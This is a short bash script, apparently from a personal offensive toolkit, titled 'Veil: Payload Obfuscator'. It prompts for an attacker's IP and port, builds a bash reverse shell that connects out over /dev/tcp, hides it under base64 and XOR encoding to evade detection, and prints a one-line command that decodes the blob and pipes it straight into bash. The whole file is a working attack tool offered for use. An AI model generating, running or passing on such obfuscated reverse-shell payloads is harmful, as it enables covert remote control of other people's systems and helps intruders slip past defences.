#!/bin/bash

GHOST_FLAG="$HOME/Nexus/coreops/.ghost/ghost_enabled"
LOG_DIR="$HOME/Nexus/logs/lockpick"
mkdir -p "$LOG_DIR"

echo "=== Veil: Payload Obfuscator ==="

read -p "Your IP (LHOST): " LHOST
read -p "Your Port (LPORT): " LPORT

# Ghost Mode Warning
if [[ -f "$GHOST_FLAG" ]]; then
    echo "[⚠] GHOST MODE ACTIVE — outbound shell may be blocked."
fi

# Generate reverse shell payload
PAYLOAD="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
ENCODED=$(echo -n "$PAYLOAD" | base64)

# XOR Obfuscation Key
KEY=0x2A

# XOR-encode the base64 string
XOR_ENC=$(echo -n "$ENCODED" | xxd -p -c1 | while read -r byte; do
    printf "%02x" $((0x$byte ^ $KEY))
done)

echo ""
echo "[+] Encoded Payload (XOR + base64):"
echo "$XOR_ENC"
echo ""
echo "[*] To decode and execute:"
echo "echo \"$XOR_ENC\" | xxd -r -p | base64 -d | bash"
echo ""
